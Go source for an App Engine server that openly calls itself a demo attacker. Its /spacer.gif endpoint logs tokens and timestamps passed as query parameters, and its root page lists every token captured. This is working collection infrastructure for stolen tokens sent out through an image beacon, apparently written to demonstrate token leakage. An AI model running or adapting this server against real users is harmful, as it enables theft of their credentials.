package main

import (
	"fmt"
	"net/http"
	"strings"

	"google.golang.org/appengine"
)

type Token struct {
	token string
	time  string
}

func main() {
	tokens := make([]Token, 0) // FIXME: not safe for concurrent use

	http.HandleFunc("/spacer.gif", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("z")
		time := r.URL.Query().Get("t")

		if token != "" {
			tokens = append(tokens, Token{
				token: token,
				time:  time,
			})
		}

		http.ServeFile(w, r, "spacer.gif")
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)

		w.Write([]byte("This is a demo, not a real attacker\n"))
		w.Write([]byte(fmt.Sprintf("%s\n\n", strings.Repeat("=", 25))))

		// Show all of the tokens we've captured.
		// Note: the attacker likely needs other info such as the `sub`
		// (i.e. subject, e.g. user's ID) before it can actually do anything.
		w.Write([]byte("Collected tokens:\n"))
		for _, t := range tokens {
			w.Write([]byte(fmt.Sprintf("Token: %s, Received: %s\n", t.token, t.time)))
		}
	})

	appengine.Main()
}
